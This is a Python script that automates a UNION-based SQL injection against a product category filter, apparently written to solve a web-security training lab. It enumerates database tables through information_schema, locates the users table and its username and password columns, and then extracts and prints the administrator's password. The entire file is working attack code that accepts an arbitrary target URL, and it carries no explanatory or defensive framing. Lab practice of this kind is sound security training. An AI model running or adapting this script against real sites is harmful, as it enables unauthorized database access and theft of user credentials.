import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_requests(url, sql_payload):
    path = 'filter?category=Pets'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_requests(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    user_table = soup.find(string=re.compile(".*users.*"))
    if user_table:
        return user_table
    else:
        return False

def sqli_users_column(url, user_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--" %user_table
    res = perform_requests(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_col = soup.find(string=re.compile(".*username.*"))
    passwd_col = soup.find(string=re.compile(".*password.*"))
    return username_col, passwd_col

def sqli_admin(url, user_table, username_col, passwd_col):
    sql_payload = "' UNION SELECT %s, %s FROM %s--" % (username_col, passwd_col, user_table)
    res = perform_requests(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_passwd = soup.body.find(string="administrator").parent.findNext("td").contents[0]
    return admin_passwd

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("Looking for users table...")
    user_table = sqli_users_table(url)
    if user_table:
        print("[+] Found the user's table: %s" % user_table)
        username_col, passwd_col = sqli_users_column(url, user_table)
        if username_col and passwd_col:
            print("[+] Found the username column: %s" % username_col)
            print("[+] Found the password column: %s" % passwd_col)
            admin_passwd = sqli_admin(url, user_table, username_col, passwd_col)
            if admin_passwd:
                print("[+] Found the admin's password: %s" % admin_passwd)
            else:
                print("[-] Did not find the admin's password.")
        else:
            print("[-] Did not find the username column and password column.")
    else:
        print("[-] Did not find the user table.")

